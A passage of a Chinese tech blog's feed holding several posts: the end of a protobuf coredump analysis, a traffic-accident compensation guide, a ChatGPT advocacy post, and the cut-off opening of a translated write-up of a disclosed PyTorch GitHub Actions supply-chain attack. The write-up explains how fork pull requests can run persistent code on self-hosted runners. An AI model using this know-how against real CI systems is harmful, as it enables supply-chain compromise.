左右的版本，也是很古老了)，<strong>用的 bazel 版本比较老</strong>，大概是 2017 年的版本。在 BUILD 文件中，也大量使用 <code>include=[&#39;.&#39;]</code>，导致头文件的依赖路径很乱，所以 lib 库虽然依赖关系不全，但是仍然可以编译过，为后续的 coredump 埋下伏笔。如果升级到新版本 bazel，依赖的管理更加严格，这种依赖缺失的 BUILD 写法就会更容易发现了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>最后简单总结下吧。问题的开始是简单给 proto 增加了一个字段，没想到竟然导致了 coredump。虽然知道和增加字段这个变更有关系，但是分析到具体的原因还是花了不少时间。</p><p>中间尝试过很多排查方向：</p><ol><li>protobuf 库有 bug？搜了一圈，没发现类似问题，并且用了这么久都很稳定，所以先排除这个可能。</li><li>分析 coredump 文件，没有发现有用的信息。一方面是因为对 protobuf 的实现并不是很了解，所以 core 在 pb 后就无从下手。另外 GDB 分析 core 的功底也不是很深。</li><li>不断地<strong>剥离无关的逻辑</strong>，争取能找到一个可以复现的小 demo。这里是同事最终找到了一个复现的步骤，成为突破口。在同事稳定复现后，就比较容易猜到、并验证这里和用了不同版本的 proto 有关。</li></ol><p>然后想着写一篇文章来记录下这个不常见的坑，在准备文章开始的复盘代码时，又遇到了个问题。之前同事复现的时候，其实带了很多项目中的代码逻辑，bazel 的依赖关系也比较复杂。而在文章中，我想用<strong>最简单的代码</strong>复现并说明问题。最开始模拟改动 proto 的时候，只是增加一个 string 字段，结果发现并不会导致 coredump。虽然这里 Data 对象的内存布局不一样，但是<strong>凑巧</strong>读写内存都正常，没触发内存非法访问。后来想到增加这里的“扰动”，尝试换了 repeated，才能稳定复现 coredump。</p><p>复盘代码足够简单的一个好处就是，用 GDB 调试起来也比较方便，不会有太多无关的信息。通过对比 core 和正常代码中，对象内存地址的变化，再一次验证确实是因为用了不同版本的 pb 对象导致的 core。不过本文还是缺少一些深度，<strong>没有去深入分析不同版本的 pb 为什么会导致地址错乱</strong>，这部分估计得深入 protobuf 的实现了。</p><p>最后一个问题，后续怎么在项目中避免这类问题呢？首先避免用 <code>include [&#39;.&#39;]</code> 带来混乱的头文件查找路径，然后<strong>规范依赖管理</strong>，所有用到 protobuf 的库，都要加上对 pb 的依赖。当然，如果能升级 bazel 最好，不过这就需要花费更多人力了。</p>]]></content>
    
    
    <summary type="html">本文先复现业务中 coredump 问题、然后通过 GDB 排查C++ 对象内存布局，揭示了 Bazel 依赖管理不完整导致不同版本 protobuf 文件混用引发的内存错误，同时也介绍了链接符号决议，bazel 依赖管理等内容。</summary>
    
    
    
    <category term="程序设计" scheme="https://selfboot.cn/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
    
    
    <category term="C++" scheme="https://selfboot.cn/tags/C/"/>
    
    <category term="Debug" scheme="https://selfboot.cn/tags/Debug/"/>
    
  </entry>
  
  <entry>
    <title>交通事故赔偿实用法律指南，小盛律师详细解读</title>
    <link href="https://selfboot.cn/2024/03/13/traffic_accident_lawyer/"/>
    <id>https://selfboot.cn/2024/03/13/traffic_accident_lawyer/</id>
    <published>2024-03-13T13:13:19.000Z</published>
    <updated>2024-06-07T06:32:37.905Z</updated>
    
    <content type="html"><![CDATA[<p>最近看到一个段子：如果被车撞了要赔偿的话，斑马线外 3 万，斑马线内 30 万，被撞后爬到斑马线内也算斑马线内。当然，<strong>作为熟悉相关法律规定的执业律师</strong>，看到这种段子一笑而过就是了。交通事故的赔偿可不是这么简单的，<strong>不同的情况，赔偿的金额也不一样</strong>。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240313_traffic_accident_lawyer.png" alt="行人交通事故赔偿"></p><p>发生交通事故后，<strong>交警怎么划分责任，当事人可以索要哪些赔偿，问谁要赔偿，怎么要赔偿</strong>，大多数人可能都不清楚。接下来小盛律师就为大家详细解读下。</p><span id="more"></span><h2 id="责任划分"><a href="#责任划分" class="headerlink" title="责任划分"></a>责任划分</h2><p>发生交通事故后，第一步就是<strong>交警部门的责任认定</strong>。只有明确了责任归属，后续的赔偿才能有明确的依据。在事故发生后，交警部门通常会立即介入，开始对事故责任进行认定。这个过程包括<strong>现场勘查、询问当事人、查看监控录像、技术鉴定</strong>等方式，以确保评估的准确性和公正性。</p><p>一般来说，如果案件情况明确，可能在 2 周内完成责任划分。但如果事故复杂，或涉及一些技术鉴定，比如车辆鉴定等，责任认定可能需要几周甚至几个月的时间。可以咨询负责事故的警官，一般会告诉当事人在多少个工作日内完成。</p><p>交警部门划分明确后，最后会出具一个 <strong>《道路交通事故认定书》</strong>，这个<strong>认定书是后续赔偿的重要依据</strong>。一般认定书会载明交通事故的时间，地点，当事人，车辆，道路和交通环境等基本情况，以及道路交通事故证据和事故形成原因分析，最后给出责任划分结论。广东省的可以在网上查询交通事故处理结果，具体可以参考广东省公安厅的文章：<a href="https://gdga.gd.gov.cn/bsfw/bmts/content/post_2914312.html">今后交通事故处理进度结果可网上查询</a>。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231129_traffic_accident_lawyer_demo_certificate.png" alt="道路交通事故认定书"></p><p>交警一般不会划清楚责任百分比，只会给出责任类型：<strong>主要责任、次要责任、同等责任、无责任</strong>。如果当事人对责任划分不满意，可以向交警部门<strong>提出复议</strong>。复议提出是有时限要求的，要求收到交通事故认定书3日内提出，不过除非有一些新证据能说明划分不合理，否则复议一般不会改变原来的划分结果。</p><h2 id="有哪些赔偿？"><a href="#有哪些赔偿？" class="headerlink" title="有哪些赔偿？"></a>有哪些赔偿？</h2><p>责任划分好之后，就可以开始准备索赔了。具体可以索要的赔偿可以分为两大部分，一个是人身的，一个是财产的：</p><ul><li><strong>人身损害赔偿</strong>：医疗费、误工费、护理费、交通费、住宿费、住院伙食补助费、必要的营养费、残疾赔偿金、残疾辅助器具费、被扶养人生活费、康复费、后续治疗费、丧葬费、死亡补偿费、受害人亲属办理丧葬事宜支出的交通费、住宿费和误工损失等其他合理费用、精神损害抚慰金等。这部分费用种类其实特别多，不同类型的费用有不同的赔偿标准，有的费用还需要必要的证明资料，比如发票等。</li><li><strong>财产损害赔偿</strong>：因车辆灭失或者无法修复，为购买交通事故发生时与被损坏车辆价值相当的车辆重置费用；依法从事货物运输、旅客运输等经营性活动的车辆，因无法从事相应经营活动所产生的合理停运损失；非经营性车辆因无法继续使用，所产生的通常替代性交通工具的合理费用。</li></ul><p>上述赔偿的具体金额取决于<strong>事故责任的划分和实际情况</strong>。在确定赔偿金额时，法院会考虑受害人的具体情况、责任人的过错程度以及当地的经济和生活水平等因素。各地的费用标准也是有差异的，比如广东省的，可以参考<a href="http://www.hyia.org/uploads/soft/20180716/1531711363.pdf">《广东省道路交通事故损害赔偿项目计算标准(试行)》</a>，里面对各项费用的标准都有详细的规定，比如：</p><table><thead><tr><th>项目</th><th>计算方法</th><th>必要证据</th><th>说明</th></tr></thead><tbody><tr><td>医疗费</td><td>根据医疗机构出具的医疗费发票，结合病历资料和医疗费清单据实计算。</td><td>1.医疗费发票； 2.医疗费清单； 3.病历资料。</td><td>1.医嘱确定的与交通事故损害有关的院外购药费用以及受害人原有疾病控制治疗费用应计入赔偿范围。 2.过度医疗、挂床、贵宾医疗等不合理费用不计入赔偿范围。…</td></tr><tr><td>住院护理</td><td>150元&#x2F;天 * 住院天数 * 护理人数</td><td>1.住院证明； 2.医嘱。</td><td>无</td></tr><tr><td>出院护理，短期医嘱护理</td><td>120元&#x2F;天 * 医嘱护理天数</td><td>医嘱</td><td>医嘱护理期间评残的，计算至评残前一天。</td></tr><tr><td>康复费</td><td>根据医嘱或者司法鉴定意见确定的必然发生的费用据实计算。</td><td>医嘱或者司法鉴定意见书</td><td>医嘱与司法鉴定意见不一致的，一般以鉴定意见为准。</td></tr><tr><td>整容费以及其他后续治疗费</td><td>根据医嘱或者司法鉴定意见确定的必然发生的费用据实计算。</td><td>医嘱或者司法鉴定意见书</td><td>医嘱与司法鉴定意见不一致的，一般以鉴定意见为准。</td></tr></tbody></table><p>完整表格一共有 20 项费用清单，每一项费用都有详细的计算方法和必要证据，这里不一一列出了。强烈建议咨询<a href="https://selfboot.cn/links">小盛律师</a>，可以在适当时机提供最佳建议，梳理清可以索赔的项目和具体金额，帮你争取<strong>最大利益</strong>。</p><h2 id="问谁要赔偿？"><a href="#问谁要赔偿？" class="headerlink" title="问谁要赔偿？"></a>问谁要赔偿？</h2><p>在梳理清楚具体可以获得哪些赔偿项目后，下一个问题就是<strong>向谁索赔</strong>了。一般索赔的对象可以有：</p><ol><li>保险公司（交强险及商业险）：交强险是强制性的，主要赔偿人身损害，并且一般会先行赔付。车辆的商业险是自愿购买的，具体要看保险条款，一般赔偿人身损害和财产损失。</li><li>有过错的车主：保险赔付不够的话，可以向有过错的车主索赔。</li><li>事故司机的用人单位：部分司机为履职而发生事故，司机所在用人单位也可做索赔对象。</li></ol><p>首先来看交强险的理赔，根据最新的<a href="https://www.gov.cn/fuwu/2019-10/14/content_5439467.htm">《机动车交通事故责任强制保险条例》</a> ，交强险的赔偿范围和限额是这样的：</p><table><thead><tr><th>赔偿项目</th><th>有责</th><th>被保险人无责</th><th>支出项目</th></tr></thead><tbody><tr><td>医疗费用赔偿</td><td>≤1.8万元</td><td>≤1800元</td><td>医疗费、住院伙食补助费、营养费、整容费以及后续治疗费</td></tr><tr><td>死亡伤残赔偿</td><td>≤18万元</td><td>≤1.8万元</td><td>误工费、外地就医住宿费、就医交通费、康复费、护理费、残疾赔偿金、残疾辅助器具费、死亡赔偿金、丧葬费、处理丧葬事宜费用、被抚养人生活费、精神损害抚慰金、鉴定费</td></tr><tr><td>财产损失赔偿</td><td>≤2000元</td><td>≤100元</td><td>车辆维修、物品损失、车辆重置等直接财产损失以及评估费</td></tr><tr><td>合计</td><td>≤20万</td><td>≤1.99万</td><td></td></tr></tbody></table><p>对交强险来说，被保险人无责，赔偿金额比较少。有责任的情况下，赔偿金额上限高，但是也需要提供相关证据等。交强险目前支持<strong>先行垫付</strong>，如果受害人被抢救，且抢救费用已经发生，交警出局相关的垫付通知书，那么保险公司会先行垫付费用。</p><p>如果交强险的赔偿额度不够，可以向<strong>商业险索赔</strong>。商业险的赔偿范围和限额是根据具体的保险条款来的，一般来说，商业险的赔偿范围会比交强险要广泛，赔偿限额也会更高。如果责任人没有购买商业险，或者商业险的赔偿额度不够，可以向<strong>有过错的车主</strong>索赔。如果事故司机是单位的员工，并且是在工作时间履职发生事故，那么也可以向用人单位索赔。</p><h2 id="怎么要赔偿？"><a href="#怎么要赔偿？" class="headerlink" title="怎么要赔偿？"></a>怎么要赔偿？</h2><p>交通事故发生后，有责任人联系方式的情况下，可以<strong>双方协商</strong>确定一个赔偿的金额，如果双方能就金额达成一致，那么会比其他方式要更快更便捷。如果没有责任人的联系方式或者责任人不同意赔偿方案，还可以寻求交管部门帮助进行调解赔偿。</p><p>当然，调解失败一直不能跟对方达成一致意见，可以通过向<strong>交通事故发生地法院</strong>诉讼的途径要求赔偿。诉讼的话，流程比较繁琐，耗时比较久，需要准备好相关的证据，比如医院的诊断证明、发票、交通事故认定书、现场照片等。如果是因为交通事故导致的财产损失，还需要提供相关的财产损失证明。</p><p>如果涉及的赔偿金额不大，可以自行起诉，最难的立案部分可以参考 <a href="https://selfboot.cn/2023/12/22/lawsuit_steps/">网上立案流程(广东省)详细图文教程</a>，之后自己去法院参加庭审即可。如果涉及的赔偿金额较大，或者不想麻烦，可以找<strong>小盛律师</strong>代理。</p><hr><p>我是 <a href="https://selfboot.cn/links">小盛律师</a>，欢迎关注我获取更多法律科普。如果有法律纠纷，欢迎付费咨询。</p><div class="pure-g">  <div class="pure-u-1 pure-u-md-1-3" style="width: auto;">    <img src="https://slefboot-1251736664.file.myqcloud.com/20230914_wx_qrcode_2.png" style="height: 200px; margin-right: 10px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">  </div>  <div class="pure-u-1 pure-u-md-1-3" style="width: auto;">    <img src="https://slefboot-1251736664.file.myqcloud.com/20230914_xhs_qrcode_2.png" style="height: 200px; margin-right: 10px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">  </div>  <div class="pure-u-1 pure-u-md-1-3" style="width: auto;">    <img src="https://slefboot-1251736664.file.myqcloud.com/20230914_dy_qrcode.png" style="height: 200px; margin-right: 10px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">  </div></div>]]></content>
    
    
    <summary type="html">详解交通事故赔偿的法律知识，包括交警如何出具认定书划分事故责任，人身和财产可获哪些赔偿，如何向保险公司、车主或用人单位索赔，通过协商、调解或诉讼获赔的方式及需准备的证据材料等。</summary>
    
    
    
    <category term="法律普及" scheme="https://selfboot.cn/categories/%E6%B3%95%E5%BE%8B%E6%99%AE%E5%8F%8A/"/>
    
    
    <category term="法律" scheme="https://selfboot.cn/tags/%E6%B3%95%E5%BE%8B/"/>
    
  </entry>
  
  <entry>
    <title>为什么一定要尽快用上 ChatGPT 等大语言模型</title>
    <link href="https://selfboot.cn/2024/01/25/why_need_use_gpt_asap/"/>
    <id>https://selfboot.cn/2024/01/25/why_need_use_gpt_asap/</id>
    <published>2024-01-25T20:51:29.000Z</published>
    <updated>2024-06-07T06:32:37.905Z</updated>
    
    <content type="html"><![CDATA[<p>很多年以后，当人们回忆起 2023 年，或许只会记得这是 ChatGPT 和各种大语言模型诞生的一年，这是人工智能元年！</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240123_why_need_use_gpt_asap_cover.png" alt="一定要尽快用 ChatGPT 等大语言模型"></p><span id="more"></span><p>可能有人觉得，ChatGPT 只是一个玩具，但是从个人使用体验，整体使用趋势看，它已成为一个非常有用的工具。它的影响力从发布起就没减弱过，具体可以看我之前写的 <a href="https://selfboot.cn/2023/10/26/chatgpt_impact/">ChatGPT 渗透力分析：搜索热度、需求图谱与人群特征</a>。我本人从 GPT 出来就一直在用，中间写了不少使用文章，可以在<a href="https://selfboot.cn/tags/chatgpt/">标签 ChatGPT</a> 下看到。</p><p>越来越多大牛也分享了自己的使用感悟，比如 Redis 作者 <a href="https://twitter.com/antirez">antirez</a> 在 2024 年开年写的 <a href="http://antirez.com/news/140">LLMs and Programming in the first days of 2024</a>，英伟达研究员写的 <a href="https://bartwronski.com/2024/01/22/how-i-use-chatgpt-daily-scientist-coder-perspective/">How I use ChatGPT daily (scientist&#x2F;coder perspective)</a>。除此之外 ChatGPT 在教育领域，也有不少应用，比如 <a href="https://cs.harvard.edu/malan/publications/V1fp0567-liu.pdf">Teaching CS50 with AI</a>。</p><h2 id="使用感悟"><a href="#使用感悟" class="headerlink" title="使用感悟"></a>使用感悟</h2><p>前面提到 Redis 作者写的文章，这里有翻译的版本<a href="https://baoyu.io/translations/llm/llms-and-programming-in-the-first-days-of-2024">2024 年初的大语言模型编程实践[译]</a>，这篇文章和我自己目前使用 GPT 的感触特别一致。</p><p>antirez 用 <code>Stupid but All-Knowing</code> 来形容生成式 AI。大家都知道，虽然目前的 AI 远远称不上是通用人工智能，只能进行初级的推理，还会掺杂有幻觉。但是它有许多领域的知识，十分博学，特别是在计算机编程领域。<strong>大语言模型学过的代码量远远高于绝大多数人类，因此有很强的写代码能力</strong>，甚至可以编写一些它之前未曾见过的程序。</p><p>对于大部分程序员来说，<strong>编程基本都是在重复同样的内容，不需要太高的逻辑推理能力，说是“搬砖”也不为过</strong>。有的 10 年经验程序员，可能和刚毕业的水平差不太多。目前的大语言模型，可以说能够完成绝大部分普通程序员的写代码工作。</p><p>在 antirez 看来，使用 ChatGPT 的目标<strong>不仅仅是提高编码效率</strong>，还可以在原来需要很多精力投入的地方节省大量时间。比如不再需要花费大量时间去<strong>查找某些专业且无趣的文档</strong>，不再需要学习一些过于复杂的 API，不再需要<strong>手动编写</strong>一些临时脚手架代码。这些我也是深有感触，有时候需要用到一些不熟悉的库，只需要把问题描述清楚，ChatGPT 就能给出正确的代码。如果 GPT 的知识库不够新，直接给他最新的官方文档，然后它就能学习后给出正确的代码。</p><p>不过 antirez 也提到，大语言模型有点类似于维基百科和 YouTube 上的各种高质量课程，只能帮助到那些自己有意愿和能力学习的人，有点“<strong>佛度有缘人</strong>”的感觉。对于已经在使用 GPT 的人，antirez 在文章最后特别强调了<strong>要正确的提问</strong>，这个是需要不断在实践中才能提高的技能。</p><blockquote><p><strong>正确地向大语言模型提问是一项关键技能</strong>。这项技能练习得越少，利用 AI 改善工作的能力就越弱。而且，无论是与大语言模型还是与人类交流，清晰描述问题同样重要。沟通不畅是一个严重的障碍，很多程序员尽管在自己的专业领域很有能力，但在沟通上却做得很糟糕。现在，连 Google 都变得不那么好用了，所以即便是将大语言模型作为一种压缩文档的方式来使用，也是个不错的主意。至于我，我将继续大量使用它们。我从来不喜欢去深究某个晦涩的通讯协议的细节，或者去理解由某些想要炫耀自己技术的人编写的复杂库方法。这些对我来说就像是”无用知识”。有了大语言模型，我就能免于这些困扰，每天都能感觉到它带来的帮助。</p></blockquote><p>另外 antirez 在文章最后的评论中写到，他这篇文章使用意大利语写的，因为他更熟悉意大利语，写起来也顺畅很多。写完后，他用 GPT4 翻译成了英语，读起来很流畅，只需要很少修改。既然提到了翻译，这里推荐下宝玉的 <a href="https://chat.openai.com/g/g-uBhKUJJTl-ke-ji-wen-zhang-fan-yi">GPTs: 科技文章翻译</a>，用来做翻译效果还是很棒的。我的这篇译文：<a href="https://selfboot.cn/2024/01/18/supply_chain_attack_on_pytorch/">我们是如何对 PyTorch 发起供应链攻击的 (译文)</a> 就是用这个 GPTs 翻译后，稍微润色了下。</p><p>英伟达的一个研究员，也写了一篇：<a href="https://baoyu.io/translations/ai/how-i-use-chatgpt-daily-scientist-coder-perspective">我如何每天使用 ChatGPT（从科学家和开发者的视角）[译]</a>，观点也差不多，会用 ChatGPT 来编写 <code>ffmpeg/ImageMagick</code> 命令行，写小段脚本，编写正则表达式，制作 LaTeX 图表与表格等等。这些任务在 ChatGPT 出现之前，个人需要花费很多时间，关键是也很无聊。而现在，完全可以摆脱这些无聊的事情，把时间花在更有意义的事情上。</p><h2 id="每个人的-AI-老师"><a href="#每个人的-AI-老师" class="headerlink" title="每个人的 AI 老师"></a>每个人的 AI 老师</h2><p>除了工作场景，教育领域 ChatGTP 也发挥了很大作用。在生成式 AI 刚出来没多久，已经有学生用来“帮忙”写作文，写论文，一时间，有不少高校甚至<strong>禁止使用 ChatGPT</strong>。但是越来越多的证据表明，<strong>AI 有潜力改进学习反馈过程、促进批判性思维，并增强解决问题的技巧</strong>。一直以来，哈佛希望通过软件实现 <strong>1:1 教师对学生的比例</strong>，这样每个学生就能有一个以教学为导向的专家助手。要注意，这里 AI 充当的是教师角色，也就是说<strong>需要能引导学生探索解决方案，而不是直接给出答案</strong>。</p><p>为了达到上面的目标，哈佛积极探索生成式 AI 在教育领域的应用，在哈佛 CS50 课程中，就使用了 GPT-4 作为助教，帮助学生解决问题。这套工具包括：</p><ul><li>“<strong>解释高亮代码</strong>”，用于便捷的解释选中的代码。学生随时都可以获得代码的即时解析，使得面对面的辅导时间变得更加高效，学生可以更多地专注于探讨高层次的设计问题，而不是纠结于基础的疑问解答；</li><li><strong>代码风格评估工具 style50 的增强版</strong>。一个互动式学习工具，它像人类教师一样提供指导，帮助学生更清晰地理解和实践代码的语法优化。</li><li><strong>CS50 小黄鸭</strong>，一个能够<strong>通过多个平台回答课程相关问题的聊天机器人</strong>。以一种受控制的方式，直接与 GPT-4 进行互动，利用 GPT-4 的上下文理解功能，为学生们提供了真正互动的教与学体验，并严格遵循 CS50 的教学原则。</li></ul><p>接着为了评估 AI 在教育场景的效果，对学生使用 AI 的反馈做了调研，总体来看学生反馈还是非常正面的，对 AI 工具在<strong>解决难题时的帮助性、有效性和可靠性</strong>给予高度评价：</p><blockquote><p>“简直难以置信，就像有一个私人辅导老师一样…我特别欣赏 AI 机器人回答问题时的客观公正，即使是最简单的问题也不会被小觑。它展现出了超乎寻常的耐心。”</p><p>“AI 工具对我帮助很大。它们向我解释了一些我不太清楚的概念，并教会了我解决特定问题所需的新知识。AI 工具不仅给了我足够的提示让我独立尝试，还帮我分析错误及可能遇到的问题。”</p></blockquote><p>完整的论文中文版可以在宝玉的 <a href="https://baoyu.io/translations/ai/teaching-cs50-with-ai">利用 AI 教学哈佛 CS50 课程 —— 在计算机科学教育中的生成式人工智能应用[译]</a>中看到。不管是已经工作的打工人，还是在学校的学生，ChatGPT 都能带来很大的帮助。</p><h2 id="资源紧缺的-GPT4"><a href="#资源紧缺的-GPT4" class="headerlink" title="资源紧缺的 GPT4"></a>资源紧缺的 GPT4</h2><p>经过前面的洗脑，你决定使用 ChatGPT 了。但是发现网络访问失败，然后找到我之前的文章<a href="https://selfboot.cn/2023/12/25/how-to-use-chatgpt/">安全、快速、便宜访问 ChatGPT，最新最全实践教程！</a>，经过一番努力，终于解决了网络问题，然后每个月 20$ 订阅了 Plus。结果在某天，正和 GPT4 聊的起劲儿呢，遇到下面提示：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240123_why_need_use_gpt_asap_freq_limit.png" alt="诡异的到达使用限制"></p><p>那么恭喜你，你被限流了。虽然 OpenAI 说 3 小时上限 50 条，但从实际体验来看并不是这样，也没有公开这里限流的具体策略。OpenAI 的论坛上也有很多吐槽 <a href="https://community.openai.com/t/youve-reached-the-current-usage-cap-for-gpt-4-please-try-again-after-2-04-pm/494628">You’ve reached the current usage cap for GPT-4, please try again after 2:04 PM</a>，但是官方至今也没有具体回应。遇见这个提示后，只能等到提示里的时间。</p><p>如果实在需要更多消息量，可以升级为 Team Members，每人每个月 25$。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240123_why_need_use_gpt_asap_team_members.png" alt="花钱升级 team members 提升限额"></p><p>最后，你会是那个”有缘人”，会早点用 ChatGPT 吗？</p>]]></content>
    
    
    <summary type="html">文章强调了及早使用ChatGPT等大语言模型的必要性和价值。ChatGPT不仅是一个玩具，它极大地提高了编程效率，可以节省大量手动编写代码的时间。分享了Redis作者等业内大牛的 ChatGPT 使用感受，还介绍了ChatGPT在教育领域的应用案例，强烈建议每个人尽早用起来。</summary>
    
    
    
    <category term="人工智能" scheme="https://selfboot.cn/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"/>
    
    
    <category term="方法" scheme="https://selfboot.cn/tags/%E6%96%B9%E6%B3%95/"/>
    
    <category term="ChatGPT" scheme="https://selfboot.cn/tags/ChatGPT/"/>
    
  </entry>
  
  <entry>
    <title>我们是如何对 PyTorch 发起供应链攻击的 (译文)</title>
    <link href="https://selfboot.cn/2024/01/18/supply_chain_attack_on_pytorch/"/>
    <id>https://selfboot.cn/2024/01/18/supply_chain_attack_on_pytorch/</id>
    <published>2024-01-18T16:06:20.000Z</published>
    <updated>2024-06-07T06:32:37.905Z</updated>
    
    <content type="html"><![CDATA[<p>安全问题通常滞后于技术的普及，而人工智能 (AI) 领域亦是如此。</p><p>四个月前，我和 <a href="https://adnanthekhan.com/">Adnan Khan</a> 利用了 <a href="https://github.com/pytorch/pytorch">PyTorch</a> 的一个严重 CI&#x2F;CD 漏洞，PyTorch 是全球领先的机器学习平台之一。它不仅被谷歌、Meta、波音和洛克希德·马丁等行业巨擘所使用，也因此成为黑客和各国政府的重点攻击对象。</p><p>幸运的是，我们在不法分子之前发现并利用了这个漏洞。</p><p>接下来是我们的操作过程。</p><blockquote><p>原文地址：<a href="https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/">PLAYING WITH FIRE – HOW WE EXECUTED A CRITICAL SUPPLY CHAIN ATTACK ON PYTORCH</a></p></blockquote><span id="more"></span><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在详细讲述之前，先来了解一下为何我和 Adnan 会关注机器学习的代码仓库。原因并非出于对神经网络的好奇。实际上，我对神经网络了解有限，不足以去深入研究。</p><p>PyTorch 是我和 Adnan 六个月前开始的探索之旅的起点。这段旅程始于我们在 2023 年夏季进行的 CI&#x2F;CD 研究和漏洞开发。Adnan 最初通过这些攻击手段，在 <a href="https://adnanthekhan.com/2023/12/20/one-supply-chain-attack-to-rule-them-all/">GitHub 中发现了一个重大漏洞</a>，成功植入了 GitHub 和 Azure 的所有运行器镜像的后门，并因此获得了 2 万美元的奖金。在这次攻击之后，我们联手寻找其他存在漏洞的仓库。</p><p>我们的研究成果让所有人，包括我们自己，都感到意外。我们连续<strong>对多个领先的机器学习平台、<a href="https://johnstawinski.com/2024/01/05/worse-than-solarwinds-three-steps-to-hack-blockchains-github-and-ml-through-github-actions/">价值数十亿美元的区块链</a>等实施了供应链攻击</strong>。自从我们发布了最初的博客文章后的七天内，这些内容在安全领域引起了广泛关注。</p><p>但你可能不是来这里了解我们的研究历程，而是想知道我们对 PyTorch 的攻击细节。让我们开始吧。</p><h2 id="攻击的影响"><a href="#攻击的影响" class="headerlink" title="攻击的影响"></a>攻击的影响</h2><p>我们的攻击路径使我们能够在 GitHub 上上传恶意的 PyTorch 版本，将版本上传至 AWS，甚至可能向主仓库分支添加代码，对 PyTorch 的依赖项植入后门 —— 这只是冰山一角。<strong>总而言之，情况非常严重</strong>。</p><p>正如我们在 <a href="https://www.techtarget.com/whatis/feature/SolarWinds-hack-explained-Everything-you-need-to-know">SolarWinds</a>、<a href="https://www.coindesk.com/consensus-magazine/2023/12/14/what-we-know-about-the-massive-ledger-hack/">Ledger</a> 等案例中看到的那样，像这种供应链攻击对攻击者来说极具杀伤力。<strong>拥有这样的访问权限，任何一个有实力的国家都能找到多种方式来攻击 PyTorch 的供应链</strong>。</p><h2 id="GitHub-Actions-简介"><a href="#GitHub-Actions-简介" class="headerlink" title="GitHub Actions 简介"></a>GitHub Actions 简介</h2><p>要充分理解我们的攻击手段，首先需要了解 GitHub Actions。如果想跳读某部分内容，也是可以的。</p><p>如果你对 GitHub Actions 或类似的持续集成&#x2F;持续交付 (CI&#x2F;CD) 平台不太熟悉，建议你在继续阅读前<a href="https://docs.github.com/en/actions/learn-github-actions/understanding-github-actions">先做些功课</a>。如果阅读过程中遇到不懂的技术，上网搜索一下总是好的。我通常喜欢从基础知识讲起，但要完整讲解所有的 CI&#x2F;CD 过程可是一项浩大工程。</p><p>简单来说，<strong>GitHub Actions 允许用户在 CI&#x2F;CD 过程中执行工作流里设定的代码。</strong></p><p>比如，如果 PyTorch 想在有 GitHub 用户提交 Pull Request 时进行一系列测试，它可以在一个 YAML 工作流文件中定义这些测试，并配置 GitHub Actions 来在 pull_request 触发时执行。这样，每当有 Pull Request 提交时，就会自动在一个运行环境中执行这些测试。通过这种方式，仓库的维护者就无需在合并代码前手动对每份代码进行测试。</p><p>PyTorch 的公共仓库在 CI&#x2F;CD 中大量使用 GitHub Actions。实际上，用“大量”来形容都显得不足。PyTorch 拥有超过 70 个不同的 GitHub 工作流，平均每小时运行超过十个。我们此次行动中的一个挑战是在众多工作流中筛选出我们感兴趣的那些。</p><p>GitHub Actions 的工作流在两种类型的构建运行环境中执行：一种是由 GitHub 维护并托管的托管运行环境；另一种是自托管的运行环境。</p><h3 id="自托管运行环境"><a href="#自托管运行环境" class="headerlink" title="自托管运行环境"></a>自托管运行环境</h3><p>自托管运行环境指的是最终用户在自己的基础设施上托管的构建代理服务器，运行着 Actions 运行器代理。简单来说，自托管运行环境就是配置了运行 GitHub 工作流的机器、虚拟机或容器，这些工作流属于某个 GitHub 组织或仓库。保证这些运行环境的安全和维护责任在于最终用户，而非 GitHub。因此，GitHub 通常不推荐在公开仓库上使用自托管运行环境。<strong>但似乎并非所有人都遵循这一建议</strong>，甚至<a href="https://adnanthekhan.com/2023/12/20/one-supply-chain-attack-to-rule-them-all/">连 GitHub 自己也是如此</a>。</p><p>GitHub 的一些默认设置在安全性方面并不理想。默认情况下，一旦自托管运行环境与某个仓库关联，那个仓库的任何工作流都可以使用这个运行环境。同样的设置也适用于来自 Fork 的 pull request 中的工作流。需要注意的是，任何人都可以向公开的 GitHub 仓库提交 Fork pull request，包括你自己。这意味着，在默认设置下，任何仓库贡献者都能通过提交恶意的 PR 在自托管运行环境上执行代码。</p><p>注：在 GitHub 仓库中，“贡献者”指的是向该仓库提交过代码的人。通常，人们通过提交被合并到默认分支的 PR 来成为贡献者。这一点稍后会详细讨论。</p><p>如果按照默认步骤配置自托管运行环境，那么它将是非一次性的。这意味着恶意工作流可以启动一个在任务完成后依然运行的后台进程，文件的修改（例如路径上的程序等）也会在当前工作流之后持续存在。<strong>这还意味着未来的工作流将在同一运行环境上运行</strong>。</p><h2 id="发现漏洞"><a href="#发现漏洞" class="headerlink" title="发现漏洞"></a>发现漏洞</h2><h3 id="识别自托管运行环境"><a href="#识别自托管运行环境" class="headerlink" title="识别自托管运行环境"></a>识别自托管运行环境</h3><p>为了找出自托管运行环境，我们运行了 <a href="https://github.com/praetorian-inc/gato">Gato</a>，这是由 <a href="https://www.praetorian.com/">Praetorian</a> 开发的 GitHub 攻击与利用工具。Gato 能够通过分析 GitHub 工作流文件和运行日志，确定仓库中是否存在自托管运行环境。</p><p>Gato 发现了 PyTorch 仓库中使用的几个持久性自托管运行环境。我们通过查看仓库的工作流日志来验证了 Gato 的发现。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240118_supply_chain_attack_on_pytorch_workflow_log.png" alt="Github 工作流日志验证自托管"></p><p>名为 “worker-rocm-amd-30” 的运行环境表明其为自托管类型。</p><h3 id="确认工作流审批的要求"><a href="#确认工作流审批的要求" class="headerlink" title="确认工作流审批的要求"></a>确认工作流审批的要求</h3><p>虽然 PyTorch 使用自托管运行环境，但还有一个重要因素可能成为我们的阻碍。</p><p>默认情况下，来自 Fork PRs 